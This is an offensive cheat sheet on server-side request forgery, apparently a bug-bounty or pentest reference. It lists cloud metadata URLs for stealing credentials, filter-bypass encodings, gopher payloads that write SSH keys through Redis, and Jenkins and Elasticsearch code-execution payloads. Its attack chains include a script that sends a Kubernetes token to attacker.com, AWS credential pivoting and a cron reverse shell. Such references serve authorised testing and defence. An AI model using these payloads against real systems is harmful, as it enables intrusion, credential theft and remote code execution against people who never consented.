# SSRF — Server-Side Request Forgery

## Overview

Server-Side Request Forgery (SSRF) tricks a server into making HTTP requests to an
attacker-controlled or internal destination. It earned its own category in OWASP Top 10
2021 (A10) due to the severity of cloud-environment exploitation.

**Impact:** Internal port scanning, cloud credential theft, RCE via internal services,
lateral movement inside cloud VPCs, full compromise of metadata-exposed infrastructure.

**Sources:**
- OWASP Top 10 A10:2021 — SSRF
- PortSwigger Web Security Academy — Server-side request forgery
- HackerOne Hacktivity — Capital One breach (SSRF → IMDSv1 → S3 dump), GitLab SSRF chain

---

## Basic SSRF Techniques

### Localhost / Internal Services

```
# Direct localhost
http://localhost/admin
http://127.0.0.1/admin
http://0.0.0.0/admin

# Internal RFC-1918 ranges to probe
http://10.0.0.1/
http://172.16.0.1/
http://192.168.1.1/

# Common internal service ports to target
http://localhost:8080     # Alt HTTP / dev servers
http://localhost:8443     # Alt HTTPS
http://localhost:9200     # Elasticsearch
http://localhost:9300     # Elasticsearch cluster
http://localhost:6379     # Redis
http://localhost:5432     # PostgreSQL
http://localhost:3306     # MySQL
http://localhost:27017    # MongoDB
http://localhost:2375     # Docker daemon (unauthenticated)
http://localhost:4444     # Various admin panels
http://localhost:8500     # Consul
http://localhost:8600     # Consul DNS
```

### Port Scanning via SSRF

```
# Probe internal ports — infer open/closed from response time/error
http://127.0.0.1:22      # SSH (connection refused vs timeout → port state)
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:3000    # Node dev servers
http://127.0.0.1:5000    # Flask / Python apps
http://127.0.0.1:8080
```

---

## Cloud Metadata Endpoints

### AWS EC2 Instance Metadata Service (IMDSv1)

```
# IMDSv1 — no token required (vulnerable if not upgraded to v2)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE-NAME>
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/user-data/        # Often contains secrets/scripts
http://169.254.169.254/latest/dynamic/instance-identity/document

# Credential response contains AccessKeyId + SecretAccessKey + Token
# → exfil and use with AWS CLI
```

### AWS IMDSv2 (requires PUT token first)

```bash
# Step 1 — get token (requires PUT; SSRF via GET alone won't work)
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2 — use token
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: <TOKEN>

# Note: Some SSRF vectors support custom headers (e.g., Gopher) → IMDSv2 bypass possible
```

### GCP Compute Metadata

```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
http://metadata.google.internal/computeMetadata/v1/project/project-id
# Requires header: Metadata-Flavor: Google
# IP alternative:
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure Instance Metadata Service

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Requires header: Metadata: true
```

### DigitalOcean / Oracle / Alibaba Cloud

```
# DigitalOcean
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data

# Oracle Cloud
http://169.254.169.254/opc/v2/instance/

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

---

## Blind SSRF Detection

Blind SSRF has no visible response — detection requires out-of-band (OOB) callbacks.

### Out-of-Band via Collaborator / Interactsh

```
# Use Burp Collaborator or https://app.interactsh.com for callbacks
http://YOUR-COLLABORATOR-ID.burpcollaborator.net
http://YOUR-ID.oast.fun
http://YOUR-ID.interactsh.com

# Inject in every URL-accepting parameter:
url=http://YOUR-ID.oast.fun
imageUrl=http://YOUR-ID.oast.fun/img.png
webhook=http://YOUR-ID.oast.fun/callback
```

### DNS-Only SSRF

```
# Some filters block HTTP but allow DNS — test with a DNS-only payload
# Watch for DNS query in OOB tool with no HTTP
url=http://blind-ssrf-test.YOUR-ID.oast.fun

# Subdomain-encode info for exfil:
url=http://$(hostname).YOUR-ID.oast.fun
```

### Timing-Based Detection

```
# Internal closed port → fast TCP RST (quick error)
# Internal open port → slow/timeout or valid response
# Non-existent internal IP → timeout (longer delay)
# Compare response times to infer port/host state
```

---

## Filter Bypass Techniques

### IP Obfuscation

```
# Decimal representation of 127.0.0.1
http://2130706433/

# Octal
http://0177.0.0.1/

# Hex
http://0x7f000001/

# Mixed formats
http://127.0x0.0.1/
http://127.0.00.1/

# IPv6 localhost
http://[::1]/
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/

# URL-encoded dot
http://127%2E0%2E0%2E1/

# 169.254.169.254 decimal
http://2852039166/

# 169.254.169.254 hex
http://0xa9fea9fe/
```

### Alternative Localhost Representations

```
http://localhost/
http://LOCALHOST/
http://LocalHost/
http://[::]:80/          # IPv6 any → localhost equivalent in some stacks
http://spoofed.domain/   # DNS resolves to 127.0.0.1
http://127.1/            # Short form
http://127.0.1/
```

### DNS Rebinding

```
# Register a domain that alternately resolves to your server and 127.0.0.1
# 1. App resolves domain → your server (passes allowlist check)
# 2. App makes the actual request → DNS re-resolves to 127.0.0.1
# Tools: singularity.me, rbndr.us, whonow
http://rebind.network/  # Online rebinding service
```

### Open Redirect Chain

```
# If app follows redirects, use an open redirect on an allowlisted domain
# to redirect to internal target

# Example: target allowlists example.com
https://example.com/redirect?url=http://169.254.169.254/

# Common open redirect params: redirect, next, return, url, to, dest, go
```

### Protocol Switching

```
# file:// — read local files
file:///etc/passwd
file:///etc/hosts
file:///proc/self/environ
file:///var/run/secrets/kubernetes.io/serviceaccount/token  # K8s service account token

# dict:// — port probing, banner grabbing
dict://127.0.0.1:6379/info    # Redis INFO command

# gopher:// — arbitrary TCP data (most powerful)
gopher://127.0.0.1:6379/_FLUSHALL%0D%0A

# ftp:// — some parsers allow
ftp://127.0.0.1:21/

# sftp:// / tftp:// / ldap:// — varies by stack
```

### URL Parser Inconsistencies

```
# Different parsers may interpret these differently
http://attacker.com@127.0.0.1/           # username: attacker.com, host: 127.0.0.1
http://127.0.0.1#@allowlisted.com/       # fragment tricks
http://allowlisted.com:80@127.0.0.1/     # port + credential confusion
http://127.0.0.1%0d%0a/                  # CRLF injection in URL

# Scheme case variation
HTTP://127.0.0.1/
Http://127.0.0.1/
```

---

## SSRF to RCE Escalation

### Redis via Gopher (unauthenticated Redis → RCE)

```
# Write a cron job or SSH key via Redis CONFIG SET
# URL-encoded gopher payload to write authorized_keys:
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%241%0D%0A1%0D%0A%2458%0D%0A%0A%0A%0Assh-rsa AAAA...your-pubkey...%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%2415%0D%0A/root/.ssh/%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Adbfilename%0D%0A%2415%0D%0Aauthorized_keys%0D%0A%2A1%0D%0A%244%0D%0ASAVE%0D%0A

# Tools: Gopherus (generates gopher payloads for Redis, MySQL, FastCGI, etc.)
# https://github.com/tarunkant/Gopherus
```

### Elasticsearch Code Execution (older versions)

```
# Elasticsearch <1.6 with dynamic scripting enabled
http://localhost:9200/_search?source={"script":"java.lang.Runtime.getRuntime().exec('id')"}

# POST to run scripts
POST http://localhost:9200/_search
{"script_fields":{"test":{"script":"import java.util.*;import java.io.*;new Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"}}}
```

### Jenkins Script Console

```
# Internal Jenkins at localhost:8080
http://localhost:8080/script

# If accessible, Groovy script console allows RCE:
# "println 'id'.execute().text"
```

### Spring Boot Actuator

```
# Spring Boot Actuator endpoints leak env vars, heap dumps, and allow shutdown
http://localhost:8080/actuator
http://localhost:8080/actuator/env
http://localhost:8080/actuator/heapdump
http://localhost:8080/actuator/shutdown    # POST → kills the app
http://localhost:8080/actuator/restart

# /actuator/env + /actuator/refresh → inject malicious Spring config for RCE
# (Spring Cloud + POST /actuator/env with spring.cloud.bootstrap.location=attacker URL)
```

### AWS Credential Theft → Account Pivot

```bash
# 1. Steal credentials via IMDSv1 SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role

# 2. Configure AWS CLI with stolen creds
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# 3. Enumerate permissions
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name ec2-role
aws s3 ls
aws secretsmanager list-secrets

# 4. Pivot to further services / escalate via overly-permissive role
```

---

## Common Vulnerable Parameters

```
# URL parameters frequently processed server-side
url=
imageUrl=
image_url=
avatarUrl=
avatar_url=
redirect=
next=
return=
returnUrl=
return_url=
dest=
destination=
go=
goto=
forward=
continue=
callback=
callbackUrl=
callback_url=
webhook=
webhookUrl=
webhook_url=
fetch=
endpoint=
proxy=
proxyUrl=
proxy_url=
src=
href=
link=
target=
host=
api=
feed=
data=
path=
load=
open=
download=
```

---

## Common Vulnerable Endpoints / Features

| Feature | Why Vulnerable |
|---------|---------------|
| Webhook configuration | App makes request to user-supplied URL |
| PDF generation (HTML-to-PDF) | Renders user HTML including external URLs |
| Image preview / thumbnail service | Fetches remote image via server |
| URL metadata unfurler (Slack-like) | Server fetches URL for title/OG tags |
| Import from URL | Imports CSV/JSON/XML from remote location |
| Screenshot service | Headless browser fetches URL |
| Proxy / translation service | Routes requests through server |
| OAuth / SAML metadata fetch | Fetches IdP metadata from URL |
| Dependency/package install via URL | Package manager fetches remote code |
| IP geolocation lookup | Passes host to internal geo API |

---

## Detection Notes

- Always test URL-accepting parameters with OOB payloads (Collaborator/Interactsh) first
- Check for DNS callbacks even when HTTP fails (DNS-only SSRF)
- Include SSRF probes in file upload fields (SVG with external references, XML with XXE)
- Test `Referer`, `X-Forwarded-For`, `Host` headers — some apps re-request based on these
- When you get any internal response (even an error page), escalate: try metadata endpoints
- Response timing differences reveal open vs closed ports even without response body

---

## Additional Bypass Vectors

### CIDR Range — Full 127.0.0.0/8 Loopback Block

```
# Any address in 127.0.0.0/8 resolves to loopback — not just 127.0.0.1
http://127.0.1.3/
http://127.100.200.50/
http://127.127.127.127/

# Useful when filter blocks 127.0.0.1 and localhost but doesn't check the full /8 range
```

### Ultra-Short IP Notation

```
http://0/              # Resolves to 0.0.0.0 → loopback on Linux
http://127.1/          # Short-form for 127.0.0.1
http://0177.1/         # Octal + short form
http://0x7f.1/         # Hex + short form
```

### PHP `filter_var()` FILTER_VALIDATE_URL Bypass

```
# PHP 7.x filter_var() passes these as valid URLs despite being malicious
http://test???test.com@127.0.0.1/
0://evil.com:80;http://google.com:80/
http://127.0.0.1%00@evil.com/

# If app uses filter_var() for validation, these bypass the check
```

### Unicode / Enclosed Alphanumeric Bypass

```
# Some parsers normalize Unicode before DNS resolution
# ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ resolves as example.com
# Use for allowlist bypass when filter does string comparison before normalization

http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/        # "localhost" in enclosed Unicode
http://①②⑦.⓪.⓪.①/         # 127.0.0.1 in enclosed numerals
```

### JAR Scheme (Java Environments)

```
# Fully blind — no response body, but server makes outbound connection
jar:http://127.0.0.1!/
jar:https://attacker.com!/payload.zip!/path/to/file

# Useful for Java apps (Spring, Tomcat) where other protocols are filtered
# Triggers HTTP request to the URL before the ! — confirm via OOB callback
```

### NETDOC Wrapper (Java)

```
# Java-specific alternative to file:// — bypasses some filters that block file://
netdoc:///etc/passwd
netdoc:///proc/self/environ

# Advantage: avoids \n and \r issues that file:// can have in certain contexts
```

### TFTP (UDP-based, Evades TCP Filters)

```
# TFTP operates over UDP — stateful TCP firewalls may not inspect it
tftp://attacker.com:69/TESTUDPPACKET

# Confirm OOB UDP callback with: nc -u -l -p 69
# Useful for environments with tight TCP egress but loose UDP
```

### Kubernetes Cluster Metadata

```
# K8s API server — commonly at 10.96.0.1 (default ClusterIP)
http://10.96.0.1/api/v1/namespaces/default/secrets
http://kubernetes.default.svc/api/v1/namespaces/
http://kubernetes.default.svc.cluster.local/api/v1/pods

# EKS node metadata (EC2 + K8s = two metadata surfaces)
http://169.254.169.254/latest/meta-data/   # EC2 metadata still present

# K8s service account token (mounted in every pod by default)
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Use token with API server:
curl -H "Authorization: Bearer $(cat /var/run/secrets/...)" https://kubernetes.default.svc/api/v1/pods
```

### ECS Task Metadata (AWS Fargate)

```
# ECS containers have a per-task metadata endpoint (different from EC2 IMDS)
http://169.254.170.2/v2/metadata
http://169.254.170.2/v2/credentials/<CREDENTIAL_ID>   # temporary IAM creds

# Get credential ID first:
http://169.254.170.2/v2/metadata  → look for "CredentialsRelativeUri"
→ then fetch that path for AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY + TOKEN
```

### Memcached via Gopher

```
# Gopherus-generated gopher payload for Memcached
gopher://127.0.0.1:11211/_%0d%0aset%20key%200%200%2010%0d%0ahelloworld%0d%0a

# Memcached SSRF can be used to:
# 1. Poison cached responses (cache poisoning)
# 2. Read cached data (session tokens, API responses)
# 3. If app uses Memcached for session storage → session injection → auth bypass

# Tool: gopherus --exploit memcache
```

---

## Threat Model

> Current patterns as of 2026-Q2. Update each session.

**What's being exploited in the wild:**

1. **Headless browser SSRFs** — PDF/screenshot services using Puppeteer/Chrome are the
   #1 new SSRF vector. Targets include SaaS report generators, invoice PDFs, and
   og:image generators. The renderer fetches attacker-controlled HTML, which includes
   `<script>` that hits internal metadata.

2. **IMDSv1 still common** — Despite AWS pressure to upgrade, IMDSv1 is found in
   ~30% of EC2 fleets (per disclosed reports). Legacy Terraform modules, AMI defaults,
   and inherited deployments keep it alive. Always try IMDSv1 first.

3. **Container metadata leakage** — ECS task credentials (`169.254.170.2`) and K8s
   service account tokens (`file:///var/run/secrets/...`) are the most impactful
   targets. Both yield short-lived IAM credentials or cluster API access.

4. **Webhook features as SSRF entry points** — Every app that allows users to configure
   webhook URLs is a potential SSRF. The highest-bounty pattern on HackerOne: SSRF via
   webhook + IMDSv1 = critical AWS credential theft.

5. **gopher:// is increasingly blocked** — WAFs and server-side allowlists now commonly
   block `gopher://`. Pivot to `dict://` for Redis INFO, or chain through open redirects
   to reach internal services via `http://`.

---

## Bypass Matrix

| Filter Type | Best Bypass | Notes |
|-------------|-------------|-------|
| Blocks `127.0.0.1` | `127.127.127.127` or decimal `2130706433` | Full /8 loopback block |
| Blocks `localhost` | `[::1]` or Unicode `ⓛⓞⓒⓐⓛⓗⓞⓢⓣ` | Case + protocol variation |
| Blocks `169.254.169.254` | `2852039166` (decimal) or `0xa9fea9fe` (hex) | Numeric encoding |
| Domain allowlist | `attacker.com@127.0.0.1` or open redirect on whitelisted domain | URL parser confusion |
| Scheme whitelist (http only) | `file://`, `gopher://`, `dict://` | Protocol switching |
| Follows allowlisted redirects | Open redirect on trusted domain → internal | Redirect chain |
| PHP `filter_var()` | `http://test???test.com@127.0.0.1/` | Malformed URL quirk |
| Java environment | `jar:http://127.0.0.1!/` or `netdoc:///etc/passwd` | JVM-specific schemes |
| TCP egress filter | `tftp://attacker.com:69/` | UDP bypasses TCP-only filters |
| DNS-only (HTTP blocked) | DNS callback with OOB tool | Confirm SSRF exists, then chain |
| IMDSv2 required | gopher:// with PUT headers or redirect chain | Multi-step token fetch |

---

## High-Value Targets

| Target Stack / Feature | Why High Value | Impact |
|-----------------------|----------------|--------|
| PDF generators (wkhtmltopdf, Puppeteer, headless Chrome) | Render user HTML server-side | SSRF → IMDS → AWS creds |
| Image thumbnail / resize service | Fetches remote URL before processing | Internal port scan + metadata |
| Webhook configuration (any SaaS) | User-controlled outbound URL | SSRF → internal pivot |
| OAuth metadata URL (`jwks_uri`, `metadata_url`) | Server fetches to validate token issuer | SSRF to internal PKI/CA |
| Import-from-URL (Notion, Confluence, etc.) | Proxies external content | SSRF to internal APIs |
| XML parsers with `xs:import` or XSLT | URL fetched during parsing | Blind SSRF from file processing |
| Kubernetes API server at `10.96.0.1` | Cluster-internal API, often unauthenticated | List secrets → all pod credentials |
| Redis at `127.0.0.1:6379` | Unauthenticated by default | gopher RCE → shell |
| Spring Boot Actuator `/actuator/env` | Exposes env vars + allows config injection | RCE via spring.cloud config |
| ECS `169.254.170.2` credentials | Per-task IAM credentials | AWS pivot from container |

---

## Real-World Chains

### Chain 1: Webhook SSRF → IMDSv1 → S3 Data Exfil

```
1. App allows user to configure webhook URL
2. Set webhook URL to: http://169.254.169.254/latest/meta-data/iam/security-credentials/
3. Trigger the webhook (submit a form, create a resource, etc.)
4. Response contains role name → fetch credentials:
   http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-ROLE-NAME
5. Exfil: AccessKeyId + SecretAccessKey + SessionToken
6. Configure AWS CLI → aws s3 ls → dump all S3 buckets
7. aws secretsmanager list-secrets → dump RDS passwords, API keys, etc.

Impact: Critical — full AWS account access
Real example: Capital One breach (2019), GitLab HackerOne report #1116226
```

### Chain 2: PDF Generator SSRF → K8s Service Account → Cluster Takeover

```
1. App has HTML-to-PDF feature (report generation, invoice download)
2. Inject iframe or fetch in HTML template:
   <script>
   fetch('file:///var/run/secrets/kubernetes.io/serviceaccount/token')
     .then(r=>r.text())
     .then(t=>fetch('https://attacker.com/token?t='+t))
   </script>
3. PDF service renders HTML in headless browser inside K8s pod
4. Service account token exfilled to attacker
5. Use token with K8s API:
   curl -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets
6. List all secrets in all namespaces → DB passwords, API keys, other service account tokens

Impact: Critical — full K8s cluster secret access
```

### Chain 3: SSRF → Redis Gopher → RCE → Reverse Shell

```
1. Find SSRF in imageUrl parameter
2. Confirm Redis at 127.0.0.1:6379 via dict://127.0.0.1:6379/info (check INFO response)
3. Generate cron-based reverse shell via Gopherus:
   python3 gopherus.py --exploit redis
   → select cronjob → enter reverse shell → copy gopher:// payload
4. Send via SSRF:
   imageUrl=gopher://127.0.0.1:6379/_%2A...ENCODED-CRON-PAYLOAD...
5. Cron executes → reverse shell on port 4444

Impact: Critical — RCE on server
```

### Chain 4: Blind SSRF → Internal Jenkins → Groovy RCE

```
1. Blind SSRF confirmed via OOB DNS callback
2. Port scan internal range: try 127.0.0.1:8080 — check error vs timeout
3. Fetch http://127.0.0.1:8080/script → Jenkins script console (often unauthenticated internally)
4. POST to /script:
   script=def+cmd="id".execute();def+out=new+StringBuffer();
   cmd.consumeProcessOutputStream(out);cmd.waitFor();println(out)
5. Response contains command output

Impact: Critical — RCE via internal Jenkins
```

### Chain 5: SSRF → ECS Task Credentials → Cross-Account Pivot

```
1. SSRF in containerized app (ECS Fargate)
2. Fetch: http://169.254.170.2/v2/metadata → extract CredentialsRelativeUri
3. Fetch: http://169.254.170.2/v2/credentials/<ID> → AWS temp creds
4. Assume role with trust policy:
   aws sts assume-role --role-arn arn:aws:iam::OTHER-ACCOUNT:role/admin --role-session-name pwned
5. Pivot to a different AWS account in the organization

Impact: Critical — cross-account AWS access
```
